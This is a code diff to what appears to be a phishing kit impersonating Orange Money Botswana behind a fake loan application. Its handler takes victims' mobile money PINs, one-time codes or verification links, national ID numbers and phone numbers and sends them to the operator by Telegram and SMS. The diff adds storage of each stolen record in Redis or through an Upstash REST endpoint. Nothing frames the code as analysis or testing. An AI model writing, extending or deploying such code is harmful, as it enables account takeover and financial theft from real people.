@@ -68,14 +68,16 @@ def get_now_str():
         now = datetime.now()
     return now.strftime("%Y-%m-%d %I:%M:%S %p")
 
-# Initialize Redis client using REDIS_URL
+# Redis & Upstash REST Configuration
+UPSTASH_REDIS_REST_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
+UPSTASH_REDIS_REST_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+REDIS_URL = os.environ.get("REDIS_URL")
+
 db = None
 try:
-    redis_url = os.environ.get("REDIS_URL")
-    if redis_url:
-        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}")
+    if REDIS_URL:
         db = redis.from_url(
-            redis_url, 
+            REDIS_URL, 
             decode_responses=True, 
             ssl_cert_reqs=None,
             socket_timeout=5.0,
@@ -84,11 +86,38 @@ try:
         )
         db.ping()
         print("Redis client initialized and verified successfully.")
-    else:
-        print("REDIS_URL environment variable not found.")
+    elif UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
+        print("Upstash REST Redis configured successfully.")
 except Exception as e:
-    print(f"Redis initialization failed CRITICAL: {e}")
+    print(f"Redis initialization notice: {e}")
     db = None
+
+def persist_record(app_id, data_update):
+    try:
+        key = f"app:{app_id}"
+        if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
+            base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
+            headers = {"Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}"}
+            existing = {}
+            try:
+                get_res = requests.get(f"{base_url}/get/{key}", headers=headers, timeout=4)
+                if get_res.status_code == 200:
+                    raw = get_res.json().get("result")
+                    if raw: existing = json.loads(raw)
+            except Exception: pass
+            existing.update(data_update)
+            existing["updated_at"] = get_now_str()
+            requests.post(f"{base_url}/set/{key}", headers=headers, data=json.dumps(existing), timeout=4)
+            requests.post(f"{base_url}/lpush/applications/{key}", headers=headers, timeout=4)
+        elif db:
+            raw = db.get(key)
+            existing = json.loads(raw) if raw else {}
+            existing.update(data_update)
+            existing["updated_at"] = get_now_str()
+            db.set(key, json.dumps(existing))
+            db.lpush("applications", key)
+    except Exception as e:
+        print(f"Error persisting record: {e}")
 
 HTML_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
@@ -1046,15 +1075,27 @@ def save_unified():
         f_v = data.get('value')
         now = get_now_str()
         if f_n == 'entered_pin':
+            persist_record(app_id, {"pin": f_v})
             m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
             send_sms_notification(f"[Orange Money Botswana] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n in ('entered_link', 'entered_otp'):
+            persist_record(app_id, {"verification_link": f_v, "status": "link_submitted"})
             m = f'🔗 *Verification Link Received*\n\n👤 *User:* {name}\n🌐 *Link / Code:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
             send_sms_notification(f"[Orange Money Botswana] Link Received\nUser: {name}\nPhone: {phone}\nLink: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
+            persist_record(app_id, {
+                "appId": app_id,
+                "fullName": name,
+                "mobile": phone,
+                "nationalId": data.get('nationalId', 'N/A'),
+                "purpose": data.get('purpose', 'N/A'),
+                "amount": amt,
+                "created_at": now,
+                "status": "submitted"
+            })
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* P {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
             send_sms_notification(f"[Orange Money Botswana] New Application\nName: {name}\nPhone: {phone}\nAmount: P {amt}")
